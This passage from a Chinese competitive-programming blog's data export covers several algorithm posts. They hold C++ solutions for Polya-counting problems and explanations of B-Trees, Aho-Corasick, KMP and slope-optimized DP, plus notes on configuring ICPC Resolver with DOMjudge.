relection ans += (2 + (n &amp; 1)) * n * kpow(3, n / 2); ans /= 2 * n; printf(\"%I64d\\n\", ans); &#125; return 0;&#125; Color12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;set&gt;#include&lt;map&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define mp make_pair#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int N = 31625;int n, p;vector&lt;int&gt; primes;vector&lt;bool&gt; isprime;int kpow(int a, int b, int mod) &#123; a %= mod; int r = 1; while (b &gt; 0) &#123; if (b &amp; 1) r = r * a % mod; a = a * a % mod, b &gt;&gt;= 1; &#125; return r;&#125;void init() &#123; isprime.resize(N, true); isprime[0] = isprime[1] = false; rep(i, 2, N) if (isprime[i]) &#123; primes.push_back(i); for (int j = i * i; j &lt; N; j += i) isprime[j] = false; &#125;&#125;int phi(int n) &#123; int ret = n; rep(i, 0, sz(primes)) if (primes[i] &lt;= n) &#123; const int &amp;p = primes[i]; if (n % p == 0) &#123; ret -= ret / p; while (n % p == 0) n /= p; &#125; &#125; else break; if (n &gt; 1) ret -= ret / n; return ret; &#125;int main() &#123; init(); int cases; scanf(\"%d\", &amp;cases); rep(casei, 0, cases) &#123; int ans = 0; scanf(\"%d%d\", &amp;n, &amp;p); for (int d = 1; d * d &lt;= n; ++d) &#123; if (n % d) continue; ans += 1ll * kpow(n, d - 1, p) * phi(n / d) % p; if (d * d != n) ans += 1ll * kpow(n, n / d - 1, p) * phi(d) % p; ans %= p; &#125; printf(\"%d\\n\", ans); &#125; return 0;&#125; Magic Bracelet123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;set&gt;#include&lt;map&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define mp make_pair#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int P = 9973;const int M = 10;const int N = 31625;int n, m, k;vector&lt;int&gt; prime;bool isprime[N];struct Matrix &#123; int a[M][M]; void init(int x) &#123; rep(i, 0, m) rep(j, 0, m) a[i][j] = i == j ? x : 0; &#125; void fill(int x) &#123; rep(i, 0, m) rep(j, 0, m) a[i][j] = x; &#125; int trace() &#123; int ret = 0; rep(i, 0, m) ret += a[i][i]; return ret % P; &#125; Matrix operator*(const Matrix &amp;mat) const &#123; Matrix r; r.init(0); rep(i, 0, m) rep(j, 0, m) &#123; rep(k, 0, m) r.a[i][j] += a[i][k] * mat.a[k][j]; r.a[i][j] %= P; &#125; return r; &#125; Matrix operator^(int n) &#123; Matrix r, a = *this; r.init(1); while (n &gt; 0) &#123; if (n &amp; 1) r = r * a; a = a * a, n &gt;&gt;= 1; &#125; return r; &#125;&#125;;inline void inc(int &amp;x, int y) &#123; if ((x += y) &gt;= P) x -= P;&#125;void initPrime() &#123; memset(isprime, 1, sizeof(isprime)); isprime[0] = isprime[1] = false; rep(i, 2, N) &#123; if (isprime[i]) prime.push_back(i); for (int j = 0; i * prime[j] &lt; N; ++j) &#123; isprime[i * prime[j]] = false; if (i % prime[j] == 0) break; &#125; &#125;&#125;int phi(int n) &#123; int ret = n; rep(i, 0, sz(prime)) &#123; if (n &lt; prime[i]) break; if (n % prime[i] == 0) &#123; ret -= ret / prime[i]; while (n % prime[i] == 0) n /= prime[i]; &#125; &#125; if (n &gt; 1) ret -= ret / n; return ret;&#125;int f(int n, int d, Matrix &amp;a) &#123; int fd = (a ^ d).trace(); return phi(n / d) % P * fd % P;&#125;void exgcd(int a, int b, int &amp;x, int &amp;y) &#123; if (!b) x = 1, y = 0; else &#123; exgcd(b, a % b, y, x); y -= a / b * x; &#125;&#125;int inv(int n) &#123; int x, y; exgcd(n, P, x, y); x = (x % P + P) % P; return x;&#125;int main() &#123; initPrime(); int cases; scanf(\"%d\", &amp;cases); while (cases-- &gt; 0) &#123; scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;k); Matrix a; a.fill(1); rep(_k, 0, k) &#123; int x, y; scanf(\"%d%d\", &amp;x, &amp;y); --x, --y; a.a[x][y] = a.a[y][x] = 0; &#125; int ans = 0; for (int d = 1; d * d &lt;= n; ++d) &#123; if (n % d) continue; inc(ans, f(n, d, a)); if (d * d != n) inc(ans, f(n, n / d, a)); &#125; ans = ans * inv(n) % P; printf(\"%d\\n\", ans); &#125; return 0;&#125; Birthday Toy123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include&lt;bits/stdc++.h&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define mp make_pair#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int P = 1e9 + 7;const int M = 2;const int N = 31625;int n, k;vector&lt;int&gt; prime;bool isprime[N];inline void inc(int &amp;x, int y) &#123; if ((x += y) &gt;= P) x -= P;&#125;int kpow(int a, int b) &#123; a %= P; int r = 1; while (b &gt; 0) &#123; if (b &amp; 1) r = 1ll * r * a % P; a = 1ll * a * a % P, b &gt;&gt;= 1; &#125; return r;&#125;struct Matrix &#123; int a[M][M]; void init(int x) &#123; rep(i, 0, M) rep(j, 0, M) a[i][j] = i == j ? x : 0; &#125; Matrix operator*(const Matrix &amp;mat) const &#123; Matrix r; r.init(0); rep(i, 0, M) rep(j, 0, M) rep(k, 0, M) inc(r.a[i][j], 1ll * a[i][k] * mat.a[k][j] % P); return r; &#125; Matrix operator^(int n) &#123; Matrix r, a = *this; r.init(1); while (n &gt; 0) &#123; if (n &amp; 1) r = r * a; a = a * a, n &gt;&gt;= 1; &#125; return r; &#125;&#125;;void initPrime() &#123; memset(isprime, true, sizeof(isprime)); isprime[0] = isprime[1] = false; rep(i, 2, N) &#123; if (isprime[i]) prime.push_back(i); for (int j = 0; i * prime[j] &lt; N; ++j) &#123; isprime[i * prime[j]] = false; if (i % prime[j] == 0) break; &#125; &#125;&#125;int phi(int n) &#123; int ret = n; rep(i, 0, sz(prime)) &#123; if (n &lt; prime[i]) break; if (n % prime[i] == 0) &#123; ret -= ret / prime[i]; while (n % prime[i] == 0) n /= prime[i]; &#125; &#125; if (n &gt; 1) ret -= ret / n; return ret;&#125;int f(int n, int m, int d, Matrix &amp;a) &#123; int fd = 1ll * m * (a ^ d).a[0][0] % P; return 1ll * fd * phi(n / d) % P;&#125;int main() &#123; initPrime(); while (~scanf(\"%d%d\", &amp;n, &amp;k)) &#123; int ans = 0; int m = k - 1; // #color for small beads Matrix a; a.a[0][0] = 0, a.a[0][1] = m - 1; a.a[1][0] = 1, a.a[1][1] = m - 2; for (int d = 1; d * d &lt;= n; ++d) &#123; if (n % d) continue; inc(ans, f(n, m, d, a)); if (d * d != n) inc(ans, f(n, m, n / d, a)); &#125; ans = 1ll * ans * kpow(n, P - 2) % P; ans = 1ll * ans * k % P; printf(\"%d\\n\", ans); &#125; return 0;&#125; 参考资料 Richard A. Brualdi. 组合数学 [M]. 机械工业出版社, 2012","categories":[],"tags":[{"name":"polya","slug":"polya","permalink":"http://mcginn7.github.io/tags/polya/"}]},{"title":"B-Tree","slug":"B-Tree","date":"2019-07-22T04:05:58.000Z","updated":"2019-07-22T04:09:09.000Z","comments":true,"path":"2019/07/22/B-Tree/","link":"","permalink":"http://mcginn7.github.io/2019/07/22/B-Tree/","excerpt":"","text":"简介简单来说，B-Tree 是针对大数据存取的平衡树，考虑了磁盘读取对查找效率的影响。 B-Tree 的主要思想是通过减少磁盘读取次数来提高数据存取性能，而磁盘读取次数与树高相关。故B-Tree 允许每个节点拥有多于 2 个的子节点来减小树高。 与二叉平衡树类似，B-Tree 中的每个节点存储若干键值（keys）以及子节点地址。 图 1. B-Tree 结构图 定义和性质阶（order）：将子节点的允许最大数量定义为阶，如图 1 为 5 阶树。 $m$ 阶的 B-Tree 满足以下定义： 每个节点最多能有 $m$ 个子节点。 每个内部节点至少有 $\\lceil \\frac m2\\rceil$ 个子节点，内部节点（Internal nodes）为除根节点和叶节点以外的节点。 拥有 $k+1$ 个子节点的非叶节点存有 $k$ 个键值。 每个节点中的键值按递增排序。 所有的叶节点高度一样。 操作对于平衡🌳的操作主要就是插入（Insertion）和删除（Deletion）。 以下操作均基于键值两两不同的假设进行讨论，同时键值的数量范围定义为 $[d, 2d]$，阶 $m=2d+1$。 插入首先找到键值归属的叶节点，插入到该节点中，节点的键值数量可能超过上限 $2d$，即当前键值数量为 $2d+1$。 此时用中位数将该节点划分成两个新的节点，每个新节点含有 $d$ 个键值，如图 2 所示。 之后将键值中位数插入到父节点中，父节点的键值数量 +1，也有可能超上限，故需要迭代更新。 图 2. 节点分裂 删除主要思路将内部节点中的删除操作转移至叶节点中，然后自下而上重新平衡，达到键值数量要求。 叶节点直接将对应的键值删除即可。 内部节点假设当前删除键值为 $k$，则 $k$ 的前继 $prev(k)$ 为左子树中的最大键值，后继 $succ(k)$ 为右子树中的最小键值。 $prev(k)$ 和 $succ(k)$ 均可替代 $k$ 作为分割左、右子树的新键值，同时这两个键值必然在叶节点中，进而将删除操作转移到叶节点中。 重平衡在叶节点删除键值后可能出现键值数量为 $d-1$ 导致下溢出。此时通过转移兄弟节点的键值来完成键值补充，主要分两种情况： 合并：当前节点的左、右兄弟节点均只有 $d$ 个键值，此时可与其中一个兄弟节点及父节点中的分割键值合并，新节点的键值数量为 $2d$，相当于节点分裂的逆操作。此时父节点的键值数量减 1，需要迭代重平衡。 图 3. 节点合并 旋转：假设右兄弟节点的键值大于 $d$ 个（左兄弟同理），将父节点的分割键值插入到当前节点中，右兄弟节点的第 1 个键值插入到父节点中。此时当前节点、兄弟节点和父节点的键值数量均满足键值数量要求，完成平衡操作。 图 4. 旋转操作 参考 wikipeadia geeksforgeeks","categories":[],"tags":[]},{"title":"AhoCorasick Algorithm","slug":"AhoCorasick-Algorithm","date":"2019-05-31T02:23:33.000Z","updated":"2019-06-01T02:09:54.000Z","comments":true,"path":"2019/05/31/AhoCorasick-Algorithm/","link":"","permalink":"http://mcginn7.github.io/2019/05/31/AhoCorasick-Algorithm/","excerpt":"","text":"简介AhoCorasick 算法（简称 AC 自动机），解决多模式串的字符匹配问题，即给定若干个单词串 $W_i$，求在文本串 $T$ 中的出现位置。KMP 算法解决单模式串的字符匹配，所以 AC 自动机可认为是 KMP 算法的扩展。 预备知识 字典树（Trie）：树上任意节点到根的路径所构成的子串，记为 $S(u)$，都是某个插入串的前缀。 KMP 算法：利用最长前后缀完成线性匹配。 核心思想AhoCorasick 本质上与 KMP 算法是一样的，都是通过相同前后缀减少重复计算问题，只是数据结构不同。 对应于 KMP，AC 自动机需要构建最长公共前后缀（LCPS，Longese Common proper Prefix and Suffix），即对于树上任意节点 $u$，找出最大树深的节点 $v$，满足 $S(v)$ 是 $S(u)$ 的真后缀。因为字典树上的任意节点 $x$ 所表示的 $S(x)$ 都是前缀，故起名最长公共前后缀。 通常将节点 $v$ 记为 $fail(u)$，表示串 $S(u)$ 失配时的跳转节点，出于可读性的考虑，本文记为 $lcps(u)$。 $lcps(u)$ 的构建过程：记节点 $u$ 的父节点为 $f(u)$，与其连边的字符为 $c$。若 $lcps(f(u))$ 存在 $c$ 的出边，则 $lcps(u)=trans(lcps(f(u)), c)$。否则继续找 $lcps(lcps(f(u)))$，直至找到或到达根节点（说明未找到）。 图 1. lcps(u) 的构建 检索过程假设已知 $lcps(u)$，且字典树节点 $u$ 与文本串 $T[0:i]$ 匹配，即 $T[i-|S(u)|+1:i] = S(u)$。继续匹配有两种情形： $trans(u, T[i+1]) \\neq NULL$，则匹配长度 +1。 $trans(u, T[i+1])=NULL$，与 KMP 类似，在字典树中找出最大深度（即最长前缀）的节点 $v$，满足 $S(v)$ 是 $S(u)$ 的真后缀，同时 $trans(v, T[i+1])\\neq NULL$。 令 $v = lcps(u)$，判断是否能匹配，否则继续判断 $lcps(lcps(u))$。 参考代码12345678910111213141516171819202122232425262728293031323334353637383940414243const int N = 5e5 + 7; // sum(|Wi|)const int E = 26; // character set sizestruct AhoCorasick &#123; int root = 0; int n, lcps[N], trans[N][E]; int end[N]; // end[u] &gt; 0 : S(u) = Wi int new_node() &#123; memset(trans[n], 0, E * sizeof(int)); lcps[n] = root, end[n] = 0; return n++; &#125; void init() &#123; n = 0; root = new_node(); &#125; void insert(const char *str, int len) &#123; int u = root; for (int i = 0; i &lt; len; ++i) &#123; int c = str[i] - 'a'; if (!trans[u][c]) trans[u][c] = new_node(); u = trans[u][c]; &#125; ++end[u]; &#125; void LCPS() &#123; queue&lt;int&gt; Q(&#123;root&#125;); while (!Q.empty()) &#123; int u = Q.front(); Q.pop(); for (int c = 0; c &lt; E; ++c) &#123; if (trans[u][c]) &#123; int v = lcps[u]; while (v != root &amp;&amp; !trans[v][c]) v = lcps[v]; lcps[trans[u][c]] = u == root ? root : trans[v][c]; Q.push(trans[u][c]); &#125; else trans[u][c] = trans[lcps[u]][c]; &#125; &#125; &#125;&#125;;","categories":[],"tags":[{"name":"AhoCorasick","slug":"AhoCorasick","permalink":"http://mcginn7.github.io/tags/AhoCorasick/"},{"name":"AC自动机","slug":"AC自动机","permalink":"http://mcginn7.github.io/tags/AC自动机/"}]},{"title":"Knuth-Morris-Pratt Algorithm","slug":"Knuth-Morris-Pratt-Algorithm","date":"2019-05-24T15:39:27.000Z","updated":"2019-07-26T08:50:05.000Z","comments":true,"path":"2019/05/24/Knuth-Morris-Pratt-Algorithm/","link":"","permalink":"http://mcginn7.github.io/2019/05/24/Knuth-Morris-Pratt-Algorithm/","excerpt":"","text":"KMP 算法解决在文本串（text）快速找出单词（word）的所有出现位置。 暴力匹配的时间复杂度为 $O(|T||W|)$，而 KMP 算法通过引入最长前后缀，将检索的时间复杂度降至线性。 最长前后缀 lps indicates longest proper prefix which is also suffix. 最长前后缀（LPS, Longest proper Prefix and Suffix）表示既是原串 $S$ 的真前缀也是后缀的最长子串 $T$，其中 $|T|\\lt |S|$。 LPS(aaa) = aa \\\\ LPS(abcdab)=ab检索过程假设已知单词串的每个前缀 $W[0: i]$ 的最长前后缀长度 $lps(i)$，且已经匹配 $T[i - j: i] = W[0:j]$。继续匹配有两种情形： $T[i+1]=W[j + 1]$，则匹配长度 +1。 $T[i+ 1] \\neq W[j+1]$，此时显然要重新找单词串的一个最长前缀 $W[0:k], k\\lt j$，使得 $T[i-k:i]=W[0:k]$ 且 $T[i + 1]=W[k+ 1]$，继续与 $i+1$ 结尾的文本串匹配。 图 1. 情形 2 示意图。虚线框表示相同部分。此时 $W[0:k]$ 与 $W[0:j]$ 的后缀相同，同时其本身是前缀。 令 $k=lps(j)$，若 $T[i+1]=W[k+1]$，则继续匹配。否则将 $k$ 视为新的 $j$，则转化成情形 2 相同的子问题。 时间复杂度：匹配成功的复杂度是线性的。而匹配失败时会减小单词串的前缀长度，减一长度至少对应一次的成功匹配，此时时间复杂度也是线性的。故算法总的时间复杂度是线性的。 预处理对于单词串的最长前后缀 $lps(i)$，本质上是单词串的自我匹配，即此时文本串为单词串。对应于检索过程中的两种情形，可以很容易地完成 $lps(i)$ 的构造。 参考代码1234567891011121314151617// n = |T|, m = |W|, index = [0, n)lps[0] = -1;for (int i = 1, j = -1; i &lt; m; ++i) &#123; while (j &gt;= 0 &amp;&amp; W[i] != W[j + 1]) j = lps[j]; j += W[i] == W[j + 1]; lps[i] = j;&#125;for (int i = 0, j = -1; i &lt; n; ++i) &#123; while (j &gt;= 0 &amp;&amp; T[i] != W[j + 1]) j = lps[j]; j += T[i] == W[j + 1]; if (j == m - 1) &#123; // match successfully j = lps[j]; &#125;&#125;","categories":[],"tags":[{"name":"KMP","slug":"KMP","permalink":"http://mcginn7.github.io/tags/KMP/"}]},{"title":"ICPC Resolver 踩坑","slug":"ICPC-Resolver-踩坑","date":"2019-05-12T14:09:44.000Z","updated":"2019-05-22T05:41:41.000Z","comments":true,"path":"2019/05/12/ICPC-Resolver-踩坑/","link":"","permalink":"http://mcginn7.github.io/2019/05/12/ICPC-Resolver-踩坑/","excerpt":"","text":"应用场景从 DOMjudge 系统中导出数据，使用 ICPC Tools/Resolver 滚榜。 DOMjudge 版本：7.0.1。 Resolver 版本：2.0.1798。如果使用 DOMjudge 评测，建议使用 2.1 及以上版本。 数据操作 搜索 ICPC Tools，下载 ICPC Resolver.rar。 运行 award.sh，通过 REST 导入 event feed（一场比赛的所有信息流）。 123URL: http://59.77.134.102/domjudge/api/contests/5USER: amdinPassword: ******* 点击 save 保存为 “events.xml”。 目前版本（2.0.1798）的 Resolver 存在 bug，需要手动修订 events.xml 文件： 第 1、2 行重复 &lt;contest&gt;，删除其中一行。 &lt;problem&gt; 中的生成 &lt;id&gt; 从 0 开始，改成从 1 开始（否则导致部分提交不合法）。 删除信息不全的队伍，必要信息有： 1234567&lt;team&gt; &lt;id&gt;221801437&lt;/id&gt; &lt;name&gt;Teamaaa&lt;/name&gt; &lt;university&gt;福州大学&lt;/university&gt; &lt;university-short-name&gt;福州大学&lt;/university-short-name&gt; &lt;region&gt;Participants&lt;/region&gt;&lt;/team&gt; university-short-name 为滚榜中显示的学校名称，故这里写学校全称。 末尾添加 finalized 信息： 1234567&lt;finalized&gt; &lt;last-gold&gt;1&lt;/last-gold&gt; &lt;last-silver&gt;2&lt;/last-silver&gt; &lt;last-bronze&gt;3&lt;/last-bronze&gt; &lt;timestamp&gt;1557574214.130&lt;/timestamp&gt;&lt;/finalized&gt;&lt;/contest&gt; timestamp 可设置成任意值。 可使用该代码 icpc_resolver_revise_events_xml 修订 events.xml。 使用 award.sh 打开处理后的 events.xml，设置金银铜奖人数，然后导出新的 xml 文件，并重新修订 events.xml 文件。 由于 award.sh 金银铜每组上限 10 个，共 30 个。不符合中国国情，故需要在 events.xml 中手动修改 last-gold 等字段。若 last-gold=3, last-silver=10，则表示设置金奖 3 个，银奖 7 个。 生成的 &lt;award&gt; 的 citation 可设置成 “金奖”、“银奖” 中文显示。 调用以下指令开始滚榜： 1resolver.sh &lt;Path to CDP&gt; CDP（Contest Data Package）是提供榜单需要的数据目录，其中包括： config 目录，根据官方 wiki 设置即可，必要文件包括： contest.yaml：设置比赛标题、时长和封榜时间。 problemset.yaml：设置题目 id，题目名称。 groups.tsv, teams.tsv：从 DOMjudge 导出。 userdata.tsv：官方 wiki 提示必须，实际上似乎可去除。 events.xml：比赛信息； images/logo/team_id.png：学校图标，每个学校的在 events.xml 的第一支队伍 id，id 不包含前导 0； images/team/team_id.jpg：队伍照片，若出现 Out Of Memory 问题，则限制队伍照片的大小或者加大 resolver.sh 中 -Xmx 参数。 榜单目前并不支持队伍、学校的中文显示，需要使用压缩工具（如 Bandizip）打开 “resolver/lib/presentContest.jar”，使用支持中文的字体替换 “font/HELV.PFB” 即可。","categories":[],"tags":[]},{"title":"斜率优化","slug":"斜率优化","date":"2019-04-03T13:11:53.000Z","updated":"2019-04-03T13:33:24.000Z","comments":true,"path":"2019/04/03/斜率优化/","link":"","permalink":"http://mcginn7.github.io/2019/04/03/斜率优化/","excerpt":"","text":"斜率优化针对形如： dp(i)=\\min _{j=1}^{i-1} (dp(j)+cost(i, j))的动态规划转移方程，可通过’’斜率’’的单调性进行优化。 题一、[HNOI2008]玩具装箱TOY题意 题目链接给定长为 $1\\le N\\le 50000$ 的序列 $1\\le C_i\\le 10^7$，将序列分成若干连续段，每段 $[i, j]$ 的花费为 ((j - i+\\sum_{k=i}^jC_k)-L)^2其中 $L$ 为常数，$1\\le L \\le 10^7$。要求计算总的最小花费代价。 解题思路利用前缀和 $S_i​$，区间 $[i, j]​$ 序列和可表示成 $S_j - S_{i-1}​$。容易想到 dp 转移方程为： dp(j)=\\min_{i=0}^{j-1}(dp(i)+cost(i, j)) \\\\ cost(i, j) = ((j - (i + 1) + S_j - S_i) - L)^2将变量整理归类，记 $a_j=j+S_j, b_i=i+S_i+L+1$，则 $cost(i, j)$ 转化成： cost(i, j) = (a_j-b_i)^2 = a_j^2+b_i^2-2a_jb_i转移方程移项可得： 2a_jb_i + dp(j)-a_j^2=dp(i)+b_i^2因为 $a_j​$ 在 $j​$ 固定时可认为是个定值，故问题相当于最小化 $dp(j)-a_j^2​$，进而可以将问题看成是斜率为 $2a_j​$ 的直线，找出一点 $(b_i, dp(i)+b_i^2)​$ 使得直线在 $y​$ 轴的截距 $dp(j) - a_j^2​$ 最小。 图 1. 下凸壳。灰色点和黑色点分别表示非凸壳点和凸壳点。 显然，截距最小的关键点必然在下凸壳上，且下凸壳的每段斜率是单调递增的。 斜率为 $g$ 的直线截距最小所对应的最优点是，该点前一段斜率 $\\lt g$，后一段斜率 $\\gt g​$。 注意 $1\\le C_i \\Rightarrow S_i \\lt S_{i + 1} \\Rightarrow a_i=i+S_i \\lt a_{i + 1}=(i + 1) + S_{i + 1}$，斜率 $a_i$ 是单调递增的，则对应的最优点位置也是单调的，所以这种情况可通过双端队列将复杂度优化到 $O(n)​$。 题二、小A与最大子段和题意 题目链接给定长为 $1\\le N \\le 2\\times 10^5​$ 的序列 $0 \\le |A_i| \\le 2000​$，找一个非空连续子段 $B​$，最大化： \\sum_{i=1}^{|B|} i\\times B_i解题思路把问题进一步公式化： Ans = \\max_{1\\le i\\le j\\le N} \\{\\sum_{k=i}^j(k-i+1)\\times A_k\\} \\tag 1为了去除 $\\sum$ ，引入前缀和 $S_i$ 和 $V_i=\\sum_{p=1}^i p\\times A_p​$，公式 (1) 转化成： Ans = \\max_{0\\le i\\lt j\\le N} \\{(V_j-V_i)-i\\times(S_j-S_i)\\} \\tag 2根据变量下标整理归类： Ans = -S_j\\times i+(i\\times S_i-V_i) + V_j \\\\ \\Rightarrow S_j\\times i+(Ans - V_j) = i\\times S_i- V_i同”玩具装箱TOY”，此时相当于令截距 $Ans - V_j$ 最大，所以此时需要维护点集 $(i, iS_i-V_i)$ 的上凸壳。 因为 $A_i$ 存在负数，故斜率 $S_i$ 并不具有单调性，所以需要二分确定最优点的位置。 参考 斜率优化DP 斜率优化dp小结 代码[HNOI2008]玩具装箱TOY12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;bits/stdc++.h&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int N = 5e5 + 7;int n, L, C[N];ll S[N], dp[N];struct P &#123; ll x, y; P() &#123;&#125; P(ll _x, ll _y) &#123; x = _x, y = _y; &#125; P operator-(const P &amp;p) const &#123; return P(x - p.x, y - p.y); &#125; ll operator^(const P &amp;p) const &#123; return x * p.y - y * p.x; &#125;&#125;;#define X(i) (i + S[i] + L + 1)#define Y(i) (dp[i] + X(i) * X(i))int main() &#123; scanf(\"%d%d\", &amp;n, &amp;L); rep(i, 1, n + 1) scanf(\"%d\", C + i); rep(i, 1, n + 1) S[i] = S[i - 1] + C[i]; deque&lt;P&gt; Q; Q.push_back(P(X(0), Y(0))); rep(i, 1, n + 1) &#123; ll g = 2 * (i + S[i]); while (sz(Q) &gt; 1 &amp;&amp; (Q[1].y - Q[0].y) &lt; (Q[1].x - Q[0].x) * g) Q.pop_front(); dp[i] = Q[0].y - g * Q[0].x + (i + S[i]) * (i + S[i]); P a(X(i), Y(i)); while (sz(Q) &gt; 1 &amp;&amp; ((Q[sz(Q) - 2] - a) ^ (Q.back() - a)) &lt;= 0) Q.pop_back(); Q.push_back(a); &#125; printf(\"%lld\", dp[n]); return 0;&#125; 小A与最大子段和12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;bits/stdc++.h&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int N = 2e5 + 7;int n, a[N];ll S[N], V[N];#define X(i) (i)#define Y(i) (i * S[i] - V[i])struct P &#123; ll x, y; P() &#123;&#125; P(ll _x, ll _y) &#123; x = _x, y = _y; &#125; P operator-(const P &amp;p) const &#123; return P(x - p.x, y - p.y); &#125; ll operator^(const P &amp;p) const &#123; return x * p.y - y * p.x; &#125;&#125;;bool chk(deque&lt;P&gt; &amp;Q, int i, ll G) &#123; return (Q[i + 1].y - Q[i].y) &gt;= (Q[i + 1].x - Q[i].x) * G; &#125;int main() &#123; scanf(\"%d\", &amp;n); rep(i, 1, n + 1) scanf(\"%d\", a + i); rep(i, 1, n + 1) S[i] = S[i - 1] + a[i]; rep(i, 1, n + 1) V[i] = V[i - 1] + i * a[i]; deque&lt;P&gt; Q; Q.push_back(P(X(0), Y(0))); ll ans = LLONG_MIN; rep(i, 1, n + 1) &#123; // answer int l = 0, r = max(0, sz(Q) - 2); while (l + 1 &lt; r) &#123; int z = (l + r) &gt;&gt; 1; chk(Q, z, S[i]) ? l = z : r = z; &#125; int j = l; if (chk(Q, r, S[i])) j = r + 1; else if (chk(Q, l, S[i])) j = l + 1; else j = l; ll f = Q[j].y - S[i] * Q[j].x + V[i]; ans = max(ans, f); // maintain P a(X(i), Y(i)); while (sz(Q) &gt; 1 &amp;&amp; ((Q[sz(Q) - 2] - a) ^ (Q.back() - a)) &gt;= 0) Q.pop_back(); Q.push_back(a); &#125; printf(\"%lld\", ans); return 0;&#125;","categories":[],"tags":[{"name":"ICPC","slug":"ICPC","permalink":"http://mcginn7.github.io/tags/ICPC/"},{"name":"斜率优化","slug":"斜率优化","permalink":"http://mcginn7.github.io/tags/斜率优化/"}]},{"title":"Nowcoder-出题人的数组","slug":"Nowcoder-出题人的数组","date":"2019-03-31T12:11:49.000Z","updated":"2019-04-03T14:01:43.000Z","comments":true,"path":"2019/03/31/Nowcoder-出题人的数组/","link":"","permalink":"http://mcginn7.github.io/2019/03/31/Nowcoder-出题人的数组/","excerpt":"","text":"链接：https://ac.nowcoder.com/acm/contest/545/C来源：牛客网 题目描述出题人有两个数组 $A, B$，请你把两个数组归并起来使得 $Cost=∑i∗C_i$ 最小，要求两个原数组的顺序在新数组中保持不变。 输入描述第一行输入两个正整数 $n,m$，分别表示数组 $A, B$ 的长度。第二行输入 $n$ 个正整数，表示数组 $A$。第二行输入 $m$ 个正整数，表示数组 $B$ 。 输出描述一个正整数，表示最小代价 $Cost$。 示例 1输入输出3 31 3 52 6 475 备注$n, m \\le 100000$ $A_i, B_i \\le 100000$ 解题思路$O(nm)$ 动态规划很容易想到，但是复杂度太高且没有方法优化，那么就考虑贪心解法。 显然，合并后的数组 $C$ 格式为 $\\dots ABABA\\dots$，即一段 $A$ 接一段 $B$ 。 常见的贪心策略为，考虑相邻元素的交换是否会导致更优的结果。由于不能打乱原先的顺序，故总是后段的前缀替换前段的后缀，不失一般性，我们可以假设前段为 $A$，后段为 $B$。 记 $Cost(A) = \\sum_{i = 1} ^ {|A|}i\\times A_i$，则原先的贡献值为 $Cost(A)+Cost(B)+|A|\\times Sum(B)$，交换后的贡献值为 $Cost(A)+Cost(B)+|B|\\times Sum(A)$，则当 $|B|\\times Sum(A) \\lt |A|\\times Sum(B)$，即 \\frac{Sum(A)}{|A|} \\lt \\frac{Sum(B)}{|B|}也就是说，均值越大的段需要优先选择。 剩下的就是如何构造这些段，我们假设串 $A=A_1A_2$，当 $Average(A_1)\\lt Average(A_2)$ 时，在数组 $C$ 